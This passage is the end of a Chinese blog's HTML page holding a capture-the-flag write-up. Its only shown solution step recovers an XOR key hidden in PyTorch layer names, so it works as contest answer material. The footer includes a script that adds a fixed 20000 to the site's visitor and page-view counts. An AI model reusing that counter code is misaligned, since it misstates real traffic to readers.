+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odict_keys([&#x27;conv1.weight&#x27;, &#x27;conv1.bias&#x27;, &#x27;conv2.weight&#x27;, &#x27;conv2.bias&#x27;, &#x27;XOR_KEY_PART2_998244353ISAPRIME.weight&#x27;, &#x27;XOR_KEY_PART2_998244353ISAPRIME.bias&#x27;, &#x27;XOR_KEY_PART1_CIALLO0d000721.weight&#x27;, &#x27;XOR_KEY_PART1_CIALLO0d000721.bias&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>发现是异或解密密钥为<code>CIALLO0d000721998244353ISAPRIME</code>然后把密文转16进制进行异或解密得到flag</p>
+
+    </div>
+
+    
+    
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------到底咯QAQ嘎嘎-------------</div>
+    
+</div>
+      </div>
+    <script src="https://giscus.app/client.js"
+        data-repo="jachinzhang1/jachinzhang1.github.io"
+        data-repo-id="R_kgDONy_q0w"
+        data-category="Announcements"
+        data-category-id="DIC_kwDONy_q084Cmo0P"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/10/24/%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E9%94%99%E8%AF%AF%E6%8E%92%E6%9F%A5/" rel="prev" title="程序运行错误排查">
+      <i class="fa fa-chevron-left"></i> 程序运行错误排查
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/10/28/2025-10-28-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" rel="next" title="反序列化笔记总结">
+      反序列化笔记总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">WHUCTF新生赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-User-Agent"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.User-Agent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BA%95%E5%AD%97%E6%A3%8B%E5%B0%8F%E6%B8%B8%E6%88%8F"><span class="nav-number">1.1.2.</span> <span class="nav-text">2.井字棋小游戏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-apacherrr"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.apacherrr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Guild%EF%BC%88%E8%B5%9B%E5%90%8E%E8%A7%A3%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%8C%E6%9C%89%E7%82%B9%E5%8F%AF%E6%83%9C%EF%BC%89"><span class="nav-number">1.1.4.</span> <span class="nav-text">4.Guild（赛后解出来的，有点可惜）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-ezUnser%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="nav-number">1.1.5.</span> <span class="nav-text">5.ezUnser（复现）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Zakologin%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="nav-number">1.1.6.</span> <span class="nav-text">5.Zakologin（复现）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">1.2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%8C%AB%E5%92%AA%E6%97%A5%E8%AE%B0"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.猫咪日记</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A2%85%E6%9E%97%E5%8D%88%E9%A4%90%E8%82%89"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.梅林午餐肉</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-01AI-Problem%EF%BC%88%E6%B2%A1%E6%8E%A5%E8%A7%A6%E8%BF%87%EF%BC%89"><span class="nav-number">1.2.3.</span> <span class="nav-text">3.01AI-Problem（没接触过）</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ducklinger"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Ducklinger</p>
+  <div class="site-description" itemprop="description">分享日常</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xxiaoxx998" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xxiaoxx998" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-circle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">山河辽阔，人间烟火 | 记录生活与思考的碎片</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/js/site-interactions.js"></script>
+
+</body>
+</html>
